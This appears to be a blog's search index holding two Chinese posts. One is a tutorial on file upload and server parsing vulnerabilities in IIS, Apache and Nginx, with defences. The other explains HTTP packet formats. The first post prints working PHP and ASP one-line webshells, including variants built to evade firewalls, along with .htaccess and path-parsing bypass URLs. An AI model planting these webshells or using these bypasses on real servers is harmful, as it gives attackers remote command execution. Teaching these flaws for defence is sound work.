<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件上传漏洞浅谈</title>
      <link href="/2022/12/26/wen-jian-shang-chuan-lou-dong-qian-tan/"/>
      <url>/2022/12/26/wen-jian-shang-chuan-lou-dong-qian-tan/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a><font size="8px" color="bule">文件上传漏洞</font></h2><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。<br>那webshell又是什么呢？</p><blockquote><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。<br>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。<!--?php eval($_POST[a]); ?-->就是一个最常见最原始的小马。</p></blockquote><h3 id="文件上传漏洞如何查找及判断"><a href="#文件上传漏洞如何查找及判断" class="headerlink" title="文件上传漏洞如何查找及判断?"></a><span>文件上传漏洞如何查找及判断?</span></h3><p> 黑盒：使用扫描工具扫描打开网站。<br> 黑盒：测试会员中心，测试后台。<br> 白盒：直接撸源代码。</p><h3 id="文件上传漏洞有哪些需要注意的地方"><a href="#文件上传漏洞有哪些需要注意的地方" class="headerlink" title="文件上传漏洞有哪些需要注意的地方?"></a><span>文件上传漏洞有哪些需要注意的地方?</span></h3><p> 拿到漏洞后要对漏洞类型进行区分，编辑器、第三方应用、常规等。<br> 区分漏洞类型</p><h3 id="关于文件上传漏洞在实际应用中的说明"><a href="#关于文件上传漏洞在实际应用中的说明" class="headerlink" title="关于文件上传漏洞在实际应用中的说明"></a><span>关于文件上传漏洞在实际应用中的说明</span></h3><p>上传后门脚本获取网站权限。</p><p>常规文件上传地址的获取说明：上传的文件要执行的话，要按照对应代码执行。<br>不同格式下的文件类型后门测试<br>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞=高危漏洞。<br>上传漏洞靶场环境搭建<br>测试某CMS及CVE编号文件上传漏洞测试：这种第三方插件的漏洞测试和常规漏洞测试是不一样的。</p><hr><h2 id="上传漏洞和解析漏洞"><a href="#上传漏洞和解析漏洞" class="headerlink" title="上传漏洞和解析漏洞"></a><span>上传漏洞和解析漏洞</span></h2><p>文件上传漏洞和解析漏洞经常结合完成攻击，尤其当服务器端使用了白名单进行过滤时。此时构成的危害非常的大</p><h3 id="1-IIS5和IIS6解析漏洞"><a href="#1-IIS5和IIS6解析漏洞" class="headerlink" title="1.IIS5和IIS6解析漏洞"></a><span>1.IIS5和IIS6解析漏洞</span></h3><blockquote><p>在IIS6版本中，当攻击者访问http：//<a href="http://www.xxxx.com/SingHeng.php/xxx.jpg%E8%BF%99%E6%A0%B7%E7%9A%84url%E6%97%B6%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E9%BB%98%E8%AE%A4%E5%B0%86PHP%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E4%B8%BAphp%E6%96%87%E4%BB%B6%E3%80%82%E5%9B%A0%E6%AD%A4%E8%99%BD%E7%84%B6%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E4%B8%BAjpg%EF%BC%8C%E4%BD%86%E4%BE%9D%E7%84%B6%E4%BC%9A%E8%A2%AB%E4%BD%9C%E4%B8%BAPHP%E6%89%A7%E8%A1%8C%E3%80%82">www.xxxx.com/SingHeng.php/xxx.jpg这样的url时，服务器会默认将PHP目录下的文件解析为php文件。因此虽然文件后缀为jpg，但依然会被作为PHP执行。</a></p></blockquote><blockquote><p>在IIS5和IIS6版本中，当攻击者访问http：//<a href="http://www.xxxx.com/SingHeng.php%EF%BC%9B.jpg%E8%BF%99%E6%A0%B7%E7%9A%84url%E6%97%B6%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E9%BB%98%E8%AE%A4%E4%B8%8D%E8%A7%A3%E6%9E%90%E2%80%9C%EF%BC%9B%E2%80%9D%E5%90%8E%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E5%9B%A0%E6%AD%A4SingHeng.php%EF%BC%9B.jpg%E5%B0%B1%E8%A2%AB%E4%BD%9C%E4%B8%BASingHeng.php%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C%E3%80%82">www.xxxx.com/SingHeng.php；.jpg这样的url时，服务器会默认不解析“；”后面的内容，因此SingHeng.php；.jpg就被作为SingHeng.php解析执行。</a></p></blockquote><blockquote><p>IIs畸形解析漏洞<br>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码<br><!--?php fputs(fopen("shell.php",“w”），“<?php @eval($eval($_POST[x])?-->“)?&gt;<br>将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在/upload 目录下创建了一个一句话木马文件 shell.php</p></blockquote><h3 id="2-Apache解析漏洞"><a href="#2-Apache解析漏洞" class="headerlink" title="2.Apache解析漏洞"></a><span>2.Apache解析漏洞</span></h3><p>在Apache2.2版本以前，Apache解析文件的规则为从右向左开始判断解析。如果后缀名为不可识别的文件类型，就再向左判断。比如xxxx.php.owf.rar文件，因为owf和rar都不是Apache可以识别解析的，因此Apache会将其解析为xxxx.php。<br>通过.htaccess文件绕过，先上传一个.htaccess文件内容如下</p><blockquote><p><strong>&lt;FilesMatch “3”&gt;<br>    SetHandler application/x-httpd-php<br> &lt;/FilesMatch&gt;</strong></p></blockquote><p> 只要文件名中包含了3这个数字就会被当作php文件执行<br> <img src="/img/01.png" alt=" " title="上传成功3.php"></p><p>apache漏洞主要形成于网站的配置文件，如果配置不当，很有可能出现解析漏洞，如下是存在的主要原因：</p><blockquote><p><strong>1.Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。<br>2.AddType application/x-httpd-php .jpg   有可能导致解漏洞<br>3.AddHandler 也有可能导致解析漏洞</strong></p></blockquote><p>防止绕过解析漏洞的方式：</p><blockquote><p><strong>1.开启重写模块<br>2.可以在mime.types文件里面定义常用的一些扩展名<br>3.上传文件强制改名</strong></p></blockquote><h3 id="3-Nginx解析漏洞"><a href="#3-Nginx解析漏洞" class="headerlink" title="3.Nginx解析漏洞"></a><span>3.Nginx解析漏洞</span></h3><p>在Nginx 0.8.41到1.5.6的版本中，攻击者可以利用多种方式解析文件。攻击者正常访问http：//<a href="http://www.test.com/image/bitsec.jpg%E6%97%B6%EF%BC%8C%E4%BC%9A%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E3%80%82%E4%BD%86%E6%98%AF%E5%BD%93%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%97%B6%EF%BC%8C%E5%B0%B1%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BAPHP%E6%96%87%E4%BB%B6%E3%80%82">www.test.com/image/bitsec.jpg时，会正常显示图片。但是当攻击者通过下面的方式进行访问时，就被解析为PHP文件。</a></p><blockquote><p><strong>http：//<a href="http://www.test.com/image/bitsec.jpg/bitsec.php">www.test.com/image/bitsec.jpg/bitsec.php</a> （目录解析）<br>http：//<a href="http://www.test.com/image/bitsec.jpg%00.php">www.test.com/image/bitsec.jpg%00.php</a>     （截断解析）<br>http：//<a href="http://www.test.com/image/bitsec.jpg%20/0.php">www.test.com/image/bitsec.jpg%20\0.php</a>   （截断解析）</strong></p></blockquote><p>接下来的一个漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</p><p>首先我们要知道cgi.fix_pathinfo与security.limit_extensions</p><blockquote><p>cgi.fix_pathinfo</p><blockquote><p>该选项位于配置文件php.ini中，默认值为1，表示开启。当php遇到文件路径/test.png/x.php时，若/test.png/x.php不存在，则会去掉最后的/x.php，然后判断/test.png是否存在，若存在，则把/test.png当做文件/test.png/x.php解析，如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。若是关闭该选项，访问/test.jpg/x.php 只会返回找不到文件。</p></blockquote></blockquote><blockquote><p>security.limit_extensions</p><blockquote><p>在我的配置文件中，它位于/etc/php-fpm.d/<a href="http://www.conf中/">www.conf中</a><br>这个选项开始是被注释了的也就是默认只允许执行php文件，可以在后面添加其它后缀，比如<br>security.limit_extensions .jpg .php<br>像这样添加.jpg之后，.jpg文件也能以php格式来执行<br>修改了后需要service php-fpm restart重启php</p></blockquote></blockquote><p>复现过程<br>复现环境：借助vulhub的docker测试环境<br>直接进入到路径</p><blockquote><p>nginx/nginx_parsing_vulnerability</p></blockquote><p>运行</p><blockquote><p>docker-compose up -d</p></blockquote><p>启动之后我们直接查看网关地址进行访问<br><img src="/img/02.jpg" alt=" " title="网关地址配置"><br><img src="/img/03.jpg" alt=" " title="网关地址配置"></p><p>上传图片木马成功之后，返回图片地址<br><img src="/img/03.jpg" alt=" " title="返回地址"><br>访问成功<br><img src="/img/04.jpg" alt=" " title="成功访问"></p><p>增加/x.php，可以发现图片就被解析成PHP文件<br><img src="/img/05.jpg" alt=" " title="解析成为php"></p><p>由于nginx做了如上配置，如果碰到.php后缀的就交给fastcgi来解析，因此我们可构造/test.jpg/.php(此处的.php必须是服务器端目录下不存在的如x.php等)，这里的test.jpg就是我们上传的图片木马<br>当fastcgi处理x.php时，发现文件不存在，这里php.ini配置文件中的cgi.fix_pathinfo=1就发挥了作用，如果当前路径不存在，就返回上层路径即test.jpg，此时fastcig就将test.jpg格式文件当php来解析了<br>但是，在php-fpm.conf配置文件中的security.limit_extensions配置项限制了fastcgi要解析的文件类型（如果该选项未开启，默认只解析.php）<br>查看配置文件发现这里未限制fastcgi要解析的格式，故造成nginx因错误配置不当发现解析漏洞</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><span>漏洞修复</span></h3><blockquote><p>在php版本比较低时，将php.ini文件中的cgi.fix_pathinfp的值设置为0，即关闭cgi解析<br>php-fpm.conf中的 security.limit_extensions =.php，即仅支持.php后缀解析</p></blockquote><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><span>一句话木马</span></h2><p> 攻击者通过浏览器或者其他远程连接工具，连接该后端网页，得到一个命令执行环境，以达到控制目标服务器的目的</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a><span>危害</span></h3><p>查看、上传、下载、修改文件，操作数据库，执行任意命令，提权，且webshell隐蔽性特别高，可以穿越防火墙等设备，访问webshell时不会留下日志文件</p><h3 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a><span>常见的一句话木马</span></h3><p>常见的一句话木马包括PHP、ASP、ASP.NET、JSP等语言形式。常见的代码形式包括</p><blockquote><p>PHP: &nbsp;&lt;?php @eval($_POST[‘test’])；?&gt;、<!--?php system($_GET['cmd'])；?--><br>         //@：表示后面即使执行错误，也不报错<br>         //eval（）函数：表示括号内的语句字符串全都当代码执行<br>         //$_POST[‘test’]：表示从页面中获得test这个参数值<br>ASP:   &lt;%eval request(“test”) %&gt;</p></blockquote><p>1、普通一句话：</p><blockquote><p>&lt;?php<br>@eval($_POST[123456]);<br>?&gt;</p></blockquote><p>*post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码</p><p>2、防爆破一句话：</p><blockquote><p>&lt;?php<br>substr(md5($_REQUEST[‘x’]),28)==’6862’&amp;&amp;eval($_REQUEST[‘password’]);<br>?&gt;<br>*菜刀地址<a href="http://192.168.64.137/x.php?x=myh0st">http://192.168.64.137/x.php?x=myh0st</a></p></blockquote><p>3、过狗一句话:</p><blockquote><p>&lt;?php<br>($_=@$<em>GET[s]).@$</em>($_POST[hihack])<br>?&gt; //菜刀地址 <a href="http://localhost/1.php?s=assert">http://localhost/1.php?s=assert</a><br>&lt;php $a = “a”.”s”.”s”.”e”.”r”.”t”;$a($_POST[hihack]);<br>?&gt;</p></blockquote><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>文件上传配合解析漏洞是最理想的状态，有些是用户的配置不当造成的还有的是本身中间件的问题，网站管理员在配置时尤其要为注意这些事情，<br>文件上传与文件解析漏洞的防御</p><blockquote><p>1.文件上传目录设置为不可执行。 主要Web服务器无法解析该目录下的文件， 即使攻击者成功上传了恶意脚本文件，服务器也不会受到影响。</p></blockquote><blockquote><p>2.把上传的文件存放在独立的存储上</p></blockquote><blockquote><p>3.使用随机数改写文件名和文件路径。文件上传之后，攻击者需要能访问该文件，如果能够阻止攻击者对文件的访问，同样可以阻止攻击者的攻击行为。如果使用随机数改写文件和路径，将会极大的增加攻击者的成本。比如PHP中可以通过uniqid（0函数生成一个唯一的ID,随后使用MD5对文件名进行重命名，可以防护00截断攻击。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
          <category> 网站中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于数据包的那些事</title>
      <link href="/2022/12/26/di-yi-pian-zheng-shi-de-bo-ke/"/>
      <url>/2022/12/26/di-yi-pian-zheng-shi-de-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a><font size="6" color="blue">数据包</font></h2><p>数据包的结构：数据包的结构非常复杂，不是三言两语能够说清的，在这里主要了解一下它的关键构成就可以了，这对于理解TCP/IP协议的通信原理是非常重要的。数据包主要由“目的IP地址”、“源IP地址”、“净载数据”等部分构成，包括包头和包体，包头是固定长度，包体的长度不定，各字段长度固定，双方的请求数据包和应答数据包的包头结构是一致的，不同的是包体的定义。 数据包的结构与我们平常写信非常类似，目的IP地址是说明这个数据包是要发给谁的，相当于收信人地址；源IP地址是说明这个数据包是发自哪里的，相当于发信人地址；而净载数据相当于信件的内容。 正是因为数据包具有这样的结构，安装了TCP/IP协议的计算机之间才能相互通信。我们在使用基于TCP/IP协议的网络时，网络中其实传递的就是数据包。理解数据包，对于网络管理的网络安全具有至关重要的意义。</p><h3 id="Request-请求数据包数据格式"><a href="#Request-请求数据包数据格式" class="headerlink" title="Request 请求数据包数据格式 "></a><font size="6" color="blue">Request 请求数据包数据格式 </font></h3><blockquote><p>Request Headers<br>POST&nbsp;/adduser&nbsp;HTTP/1.1<br>Host:&nbsp;localhost:8030<br>Connection:&nbsp;keep-alive<br>Content-Length:16<br>Pragma:&nbsp;no-cache<br>Cache-Control:&nbsp;no-cache<br>Origin:&nbsp;chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm<br>User-Agent:&nbsp;Mozilla/5.0(Windows&nbsp;NT&nbsp;6.1;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36{KHTML,&nbsp;like&nbsp;Gecko)<br>Chrome/66.0.3359.181&nbsp;Safari/537.36<br>Content-Type:&nbsp;application/x-www-form-urlencoded<br>VAccept:<em>/</em><br>Accept-Encoding:&nbsp;gzip,&nbsp;deflate<br>Accept-Language:&nbsp;zh-CN,zh;q=0.9<br>Form Data<br>name=name&amp;age=11</p></blockquote><p>请求行<br> 请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。<br> 例如：GET /index.html HTTP/1.1</p><blockquote><p>HTTP 规划定义了8种可能的请求方法：<br>1.GET：检索 URL 中标识资源的一个简单请求<br>2.HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档<br>3.POST：服务器接受被写入客户端输出流中的数据的请求<br>4.PUT：服务器保存请求数据作为指定 URL 新内容的请求<br>5.DELETE：服务器删除 URL 中命令的资源的请求<br>6.OPTIONS：关于服务器支持的请求方法信息的请求<br>7.TRACE：web 服务器反馈 Http 请求和其头标的请求<br>8.CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</p></blockquote><p>请求头<br>由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><blockquote><p>HOST:&nbsp;主机或域名地址<br>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格<br>式。<br>User-Agent：是客户浏览器名称<br>Host：对应网址 URL 中的 Web 名称和端口号。<br>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。<br>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive<br>为默认值，这样，当浏览器需要多个文件时(比如一个&nbsp;HTML&nbsp;文件和相关的图形文件)，不需要每次都建立<br>连接<br>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载<br>和服务器相关的用户信息，也可以用来实现会话功能。<br>Referer ：&nbsp;表&nbsp;明&nbsp;产&nbsp;生&nbsp;请&nbsp;求&nbsp;的&nbsp;网&nbsp;页 URL 。&nbsp;如&nbsp;比&nbsp;从&nbsp;网&nbsp;页&nbsp;/icconcept/index.jsp 中&nbsp;点&nbsp;击&nbsp;一&nbsp;个&nbsp;链&nbsp;接&nbsp;到&nbsp;网&nbsp;页<br>/icwork/search&nbsp;，&nbsp;在&nbsp;向&nbsp;服&nbsp;务&nbsp;器&nbsp;发&nbsp;送&nbsp;的&nbsp;GET/icwork/search&nbsp;中&nbsp;的&nbsp;请&nbsp;求&nbsp;中&nbsp;，&nbsp;Referer&nbsp;是<br><a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。<br>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。<br>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.<br>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加<br>速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</p></blockquote><p>空行<br> 最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><p>请求数据<br> 使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><h3 id="Response-返回数据包数据格式"><a href="#Response-返回数据包数据格式" class="headerlink" title="Response 返回数据包数据格式"></a><font size="6" color="blue">Response 返回数据包数据格式</font></h3><p>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</p><blockquote><p>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔<br>2.响应头标：包含服务器类型、日期、长度、内容类型等<br>3.空行：响应头与响应体之间用空行隔开<br>4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p></blockquote><p>HTTP 响应码：</p><blockquote><p>1xx：信息，请求收到，继续处理<br>2xx：成功，行为被成功地接受、理解和采纳<br>3xx：重定向，为了完成请求，必须进一步执行的动作<br>4xx：客户端错误<br>5xx：服务器错</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据包格式 </tag>
            
            <tag> web那些事 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
